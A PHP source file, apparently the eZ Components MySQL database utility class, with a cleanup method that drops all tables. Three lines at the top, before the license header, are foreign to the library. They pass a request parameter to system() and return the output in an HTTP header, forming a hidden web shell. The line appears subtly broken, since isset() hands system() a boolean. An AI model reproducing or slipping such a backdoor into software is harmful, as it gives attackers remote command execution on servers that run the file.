<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
/**
 * File containing the ezcDbUtilitiesMysql class.
 *
 * @package Database
 * @version //autogentag//
 * @copyright Copyright (C) 2005-2009 eZ Systems AS. All rights reserved.
 * @license http://ez.no/licenses/new_bsd New BSD License
 * @access private
 */

/**
 * Various database methods.
 *
 * This implementation is MySQL specific.
 *
 * This class inherits most of its database handling functionality from
 * PDO ({@link http://php.net/PDO}) -- an object-oriented database abstraction
 * layer that is going to become a new standard for PHP applications.
 *
 * @package Database
 * @todo this class must be renamed
 * @version //autogentag//
 * @access private
 */
class ezcDbUtilitiesMysql extends ezcDbUtilities
{
    /**
     * Constructs a new db util using the db handler $db.
     *
     * @param ezcDbHandler $db
     */
    public function __construct( $db )
    {
        parent::__construct( $db );
    }

    /**
     * Remove all tables from the database.
     */
    public function cleanup()
    {
        $this->db->beginTransaction();
        $rslt = $this->db->query( 'SHOW TABLES' );
        $rslt->setFetchMode( PDO::FETCH_NUM );
        $rows = $rslt->fetchAll();
        foreach ( $rows as $row )
        {
            $table = $row[0];
            $this->db->exec( "DROP TABLE `$table`" );
        }
        $this->db->commit();
    }
}

?>
